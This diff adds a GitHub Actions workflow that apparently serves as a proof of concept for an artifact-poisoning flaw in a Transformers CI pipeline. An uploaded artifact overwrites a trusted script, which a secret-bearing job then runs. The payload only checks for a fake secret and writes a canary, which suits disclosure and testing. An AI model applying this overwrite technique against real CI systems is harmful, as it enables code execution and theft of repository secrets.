@@ -1,0 +1,88 @@
+name: Single-artifact workspace overwrite validation
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  attacker_artifact:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create harmless attacker-controlled report artifact
+        run: |
+          mkdir -p attacker-artifact/utils
+          cat > attacker-artifact/utils/notification_service.py <<'PY'
+          import os
+          from pathlib import Path
+
+          visible = os.environ.get("FAKE_CI_SECRET") == "FAKE_TRANSFORMERS_CI_SECRET_DO_NOT_USE"
+          Path("ARTIFACT_RCE_CANARY").write_text(str(visible), encoding="utf-8")
+          print("ATTACKER_ARTIFACT_EXECUTED=true")
+          print(f"FAKE_SECRET_VISIBLE={str(visible).lower()}")
+          PY
+          printf 'forces the real warning extractor to call os.listdir() on a file\n' > attacker-artifact/BREAK_WARNING_EXTRACTION
+          find attacker-artifact -type f -print
+      - name: Upload the only artifact with the Transformers action version
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          name: single-gpu_run_models_gpu_models_canary_test_reports
+          path: attacker-artifact/
+
+  warning_extractor:
+    needs: attacker_artifact
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download as the real warning job does
+        uses: ydshieh/download-artifact@034d574170fc2fbcc74842d25304666dad52f1ad
+        with:
+          path: warnings_in_ci
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Exercise the vulnerable real-code shape
+        run: |
+          python3 - <<'PY'
+          import os
+
+          artifact_dir = "warnings_in_ci"
+          from_gh = True
+          paths = [
+              os.path.join(artifact_dir, p)
+              for p in os.listdir(artifact_dir)
+              if p.endswith(".zip") or from_gh
+          ]
+          print("warning_paths=", paths)
+          for path in paths:
+              os.listdir(path)
+          PY
+      - name: This artifact must be skipped after the extractor failure
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          name: warnings_in_ci
+          path: warnings_in_ci/selected_warnings.json
+
+  secret_bearing_consumer:
+    if: ${{ always() && needs.attacker_artifact.result == 'success' }}
+    needs: [attacker_artifact, warning_extractor]
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create the trusted checkout file that must be overwritten
+        run: |
+          mkdir -p utils
+          cat > utils/notification_service.py <<'PY'
+          raise SystemExit("TRUSTED_BASE_FILE_EXECUTED_INSTEAD")
+          PY
+      - name: Download all artifacts exactly as Slack report does
+        uses: ydshieh/download-artifact@034d574170fc2fbcc74842d25304666dad52f1ad
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          chunk-delay: 1000
+      - name: Execute the post-download path with a fake secret
+        env:
+          FAKE_CI_SECRET: FAKE_TRANSFORMERS_CI_SECRET_DO_NOT_USE
+          WARNING_JOB_RESULT: ${{ needs.warning_extractor.result }}
+        run: |
+          test "$WARNING_JOB_RESULT" = failure
+          python3 utils/notification_service.py
+          test "$(cat ARTIFACT_RCE_CANARY)" = True
+          echo "SINGLE_ARTIFACT_WORKSPACE_OVERWRITE_CONFIRMED=true"
